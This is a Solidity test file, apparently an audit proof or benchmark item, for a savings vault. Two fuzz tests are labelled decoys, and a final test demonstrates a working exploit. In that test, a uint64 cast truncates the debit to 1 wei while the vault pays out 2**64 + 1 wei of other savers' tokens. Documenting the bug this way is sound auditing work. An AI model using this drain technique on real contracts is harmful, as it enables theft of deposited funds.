// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Proof} from "proof/Vm.sol";
import {Savings} from "../src/Savings.sol";

// Unmodified OpenZeppelin 5.4.0 ERC20, 18 decimals; mint is exposed for the setup only.
contract Token is ERC20("Token", "TKN") {
    function mint(address to, uint256 v) external { _mint(to, v); }
}

contract SavingsProof is Proof {
    Token token;
    Savings savings;
    address alice = address(0xA11CE);
    address bob = address(0xB0B);

    function setUp() public {
        token = new Token();
        savings = new Savings(IERC20(address(token)));
        token.mint(alice, 15e18);
        vm.prank(alice);
        token.approve(address(savings), type(uint256).max);
        vm.prank(alice);
        savings.deposit(15e18);          // fits in uint64 (max is about 18.45e18)
        token.mint(address(savings), 1000e18); // other savers' deposits
    }

    // Decoy: the unchecked subtraction never wraps, for any uint256 input. The require compares
    // the same 64-bit debit that is subtracted, so credit can only fall, never jump to a huge value.
    function testFuzz_decoy_uncheckedSubtractionNeverWraps(uint256 amount) public {
        vm.assume(amount <= 1015e18); // the vault cannot pay more than it holds
        uint64 before = savings.credit(alice);
        vm.prank(alice);
        try savings.withdraw(amount) {
            assertEq(savings.credit(alice), before - uint64(amount), "credit fell by the 64-bit debit");
        } catch {
            assertEq(savings.credit(alice), before, "credit changed on revert");
        }
        assertTrue(savings.credit(alice) <= before, "unchecked subtraction wrapped");
    }

    // Decoy, exact path: within uint64, a withdraw pays exactly what it debits.
    function testFuzz_decoy_inRangeWithdrawPaysWhatItDebits(uint64 amount) public {
        uint64 before = savings.credit(alice);
        uint256 held = token.balanceOf(alice);
        vm.prank(alice);
        if (amount > before) {
            vm.expectRevert(bytes("insufficient"));
            savings.withdraw(amount);
        } else {
            savings.withdraw(amount);
            assertEq(token.balanceOf(alice) - held, uint256(before - savings.credit(alice)), "paid equals debited");
        }
    }

    // Real cause: uint64(amount) silently drops the high bits (explicit conversions are not
    // checked in 0.8), so the debit is 1 wei while the transfer pays the full 2**64 + 1.
    function test_loss_castTruncatesDebitButNotPayout() public {
        token.mint(bob, 1);
        vm.startPrank(bob);
        token.approve(address(savings), 1);
        savings.deposit(1);
        uint256 amount = uint256(type(uint64).max) + 2; // 2**64 + 1
        savings.withdraw(amount);
        vm.stopPrank();
        assertEq(savings.credit(bob), 0, "debited only 1 wei");
        assertEq(token.balanceOf(bob), amount, "paid 2**64 + 1 wei");
        assertTrue(token.balanceOf(bob) > 18e18, "more than 18 tokens for a 1-wei credit");
    }
}
